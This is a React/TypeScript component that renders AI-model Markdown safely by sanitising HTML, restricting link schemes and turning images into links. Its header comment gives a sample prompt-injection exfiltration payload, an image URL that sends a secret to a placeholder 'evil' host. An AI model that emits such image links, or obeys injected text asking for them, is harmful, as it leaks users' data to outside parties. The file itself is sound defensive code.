/**
 * Markdown from a model is untrusted (CR-006 G3). Defences, in depth:
 * 1. raw HTML is skipped, never parsed (`skipHtml`);
 * 2. the HTML tree is sanitised (rehype-sanitize, GitHub's schema);
 * 3. links: only http(s) and mailto, opened in a new tab without referrer or opener;
 * 4. images are never loaded: a prompt-injected `![](https://evil/?q=<secret>)`
 *    would leak data the moment it renders, so an image is shown as a link;
 * 5. the page's Content-Security-Policy (nginx) blocks anything that slips through.
 */
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeSanitize from "rehype-sanitize";
import remarkGfm from "remark-gfm";

const SAFE_URL = /^(https?:|mailto:)/i;

export function safeUrl(url: unknown): string | null {
  return typeof url === "string" && SAFE_URL.test(url.trim()) ? url.trim() : null;
}

const components: Components = {
  a: ({ href, children }) => {
    const url = safeUrl(href);
    return url ? (
      <a href={url} target="_blank" rel="noopener noreferrer nofollow" className="text-indigo-600 underline dark:text-indigo-400">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    );
  },
  img: ({ src, alt }) => {
    const url = safeUrl(src);
    const label = `image: ${alt?.trim() ? alt : "untitled"}`;
    return url ? (
      <a href={url} target="_blank" rel="noopener noreferrer nofollow" className="text-indigo-600 underline dark:text-indigo-400">
        [{label}]
      </a>
    ) : (
      <span>[{label}]</span>
    );
  },
  pre: ({ children }) => (
    <pre className="my-2 overflow-x-auto rounded-lg bg-slate-900 p-3 text-sm text-slate-100">{children}</pre>
  ),
  code: ({ children, className }) => (
    <code className={className ?? "rounded bg-slate-100 px-1 py-0.5 text-[0.9em] dark:bg-slate-800"}>{children}</code>
  ),
  table: ({ children }) => (
    <div className="my-2 overflow-x-auto">
      <table className="border-collapse text-sm">{children}</table>
    </div>
  ),
  th: ({ children }) => <th className="border border-slate-300 px-2 py-1 text-left dark:border-slate-700">{children}</th>,
  td: ({ children }) => <td className="border border-slate-300 px-2 py-1 dark:border-slate-700">{children}</td>,
};

export function Markdown({ text }: { text: string }) {
  return (
    <div className="prose-chat">
      <ReactMarkdown remarkPlugins={[remarkGfm]} rehypePlugins={[rehypeSanitize]} components={components} skipHtml>
        {text}
      </ReactMarkdown>
    </div>
  );
}
